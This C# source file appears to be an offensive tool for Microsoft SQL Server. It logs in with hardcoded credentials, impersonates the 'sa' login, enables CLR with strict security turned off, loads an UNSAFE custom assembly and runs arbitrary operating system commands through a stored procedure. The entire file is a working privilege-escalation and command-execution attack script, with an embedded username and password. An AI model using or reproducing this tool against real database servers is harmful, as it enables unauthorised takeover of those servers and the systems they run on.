using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Data.SqlClient;

namespace SqlCustomAssemblyLoad
{
    class Program
    {
        static void Main(string[] args)
        {
            if(args == null || args.Length != 2)
            {
                Console.WriteLine("Usage: " + System.AppDomain.CurrentDomain.FriendlyName + " sqlserver command\n");
                Environment.Exit(0);
            }

            // Variables
            String sqlServer = args[0];
            String database = "master";
            // String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            String conString = "Server = " + sqlServer + "; Database = " + database + "; UID=webapp11; PWD=89543dfGDFGH4d";
            //String cmd = "whoami";
            String cmd = args[1];
            String nameAssembly = "myAssembly";
            String nameProcedure = "cmdExec";
            String commandSql = "execCommand";
            //String file = "c:\\tools\\SqlStoredProcedure.dll";
            String file = "";

            SqlConnection con = new SqlConnection(conString);

            try
            {
                con.Open();
                Console.WriteLine("[+] Auth success");
            }
            catch
            {
                Console.WriteLine("[!] Auth failed");
                Environment.Exit(0);
            }

            // Get system user
            try
            {
                String querysyslogin = "SELECT SYSTEM_USER;";
                SqlCommand sysusercommand = new SqlCommand(querysyslogin, con);
                SqlDataReader sysuserreader = sysusercommand.ExecuteReader();
                sysuserreader.Read();
                Console.WriteLine("[+] Logged in as: " + sysuserreader[0]);
                sysuserreader.Close();
            }
            catch
            {
                Console.WriteLine("[!] Error selecting system user");
                con.Close();
                Environment.Exit(0);
            }
            
            // Get current user
            try
            {
                String queryuserlogin = "SELECT CURRENT_USER;";
                SqlCommand usercommand = new SqlCommand(queryuserlogin, con);
                SqlDataReader userreader = usercommand.ExecuteReader();
                userreader.Read();
                Console.WriteLine("[+] Mapped to the user: " + userreader[0]);
                userreader.Close();
            }
            catch
            {
                Console.WriteLine("[!] Error selecting current user");
                con.Close();
                Environment.Exit(0);
            }
            
            // Find public role membership
            try
            {
                String querypublicrole = "SELECT IS_SRVROLEMEMBER('public');";
                SqlCommand publiccommand = new SqlCommand(querypublicrole, con);
                SqlDataReader publicreader = publiccommand.ExecuteReader();
                publicreader.Read();
                Int32 publicRole = Int32.Parse(publicreader[0].ToString());
                publicreader.Close();
            }
            catch
            {
                Console.WriteLine("[!] Error selecting role membership");
                con.Close();
                Environment.Exit(0);
            }

            // Find sysadmin role membership
            try
            {
                String querysysadminrole = "SELECT IS_SRVROLEMEMBER('sysadmin');";
                SqlCommand sysadmincommand = new SqlCommand(querysysadminrole, con);
                SqlDataReader sysadminreader = sysadmincommand.ExecuteReader();
                sysadminreader.Read();
                Int32 sysadminRole = Int32.Parse(sysadminreader[0].ToString());
                sysadminreader.Close();
            }
            catch
            {
                Console.WriteLine("[!] Error selecting sysadmin role membership");
                con.Close();
                Environment.Exit(0);
            }

            // SQL Commandstrings
            String impersonatedUser = "EXECUTE AS LOGIN = 'sa';";
            String enable_clr = "use msdb; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'clr enabled', 1; RECONFIGURE; EXEC sp_configure 'clr strict security', 0; RECONFIGURE;";
            String dropAssembly = "DROP ASSEMBLY IF EXISTS " + nameAssembly + ";";
            String dropProcedure = "DROP PROCEDURE IF EXISTS [dbo].[" + nameProcedure + "];";
            String createAssembly = "CREATE ASSEMBLY "+ nameAssembly + " FROM " + file + " WITH PERMISSION_SET = UNSAFE;";
            String createProcedure = "CREATE PROCEDURE [dbo].[" + nameProcedure + "] @" + commandSql + " NVARCHAR (4000) AS EXTERNAL NAME [" + nameAssembly + "].[StoredProcedure].[" + nameProcedure + "];";
            String invokeProcedure = "EXEC " + nameProcedure + " '" + cmd + "'";

            // Impersonate
            try
            {
                SqlCommand command = new SqlCommand(impersonatedUser, con);
                SqlDataReader reader = command.ExecuteReader();
                reader.Close();
            }
            catch
            {
                Console.WriteLine("[!] Error impersonating");
                con.Close();
                Environment.Exit(0);
            }


            // Enable CLR
            try
            {
                SqlCommand command = new SqlCommand(enable_clr, con);
                SqlDataReader reader = command.ExecuteReader();
                reader.Close();
            }
            catch
            {
                Console.WriteLine("[!] Error enabling CLR");
                con.Close();
                Environment.Exit(0);
            }

            try
            {
                // Drop procedure if it exists
                SqlCommand command = new SqlCommand(dropProcedure, con);
                SqlDataReader reader = command.ExecuteReader();
                reader.Close();

                // Drop assembly if it exists
                command = new SqlCommand(dropAssembly, con);
                reader = command.ExecuteReader();
                reader.Close();

                // Create assembly from file
                command = new SqlCommand(createAssembly, con);
                reader = command.ExecuteReader();
                reader.Close();

                // Create stored procedure
                command = new SqlCommand(createProcedure, con);
                reader = command.ExecuteReader();
                reader.Close();
            }
            catch
            {
                Console.WriteLine("[!] Error manipulating procedures");
                con.Close();
                Environment.Exit(0);
            }

            // Invoke procedure
            try
            {
                SqlCommand command = new SqlCommand(invokeProcedure, con);
                SqlDataReader reader = command.ExecuteReader();
                reader.Read();
                Console.WriteLine("[*] Result of command is: " + reader[0]);
                reader.Close();
            }
            catch
            {
                Console.WriteLine("[!] Error invoking procedure");
                con.Close();
                Environment.Exit(0);
            }

            con.Close();
        }
    }
}
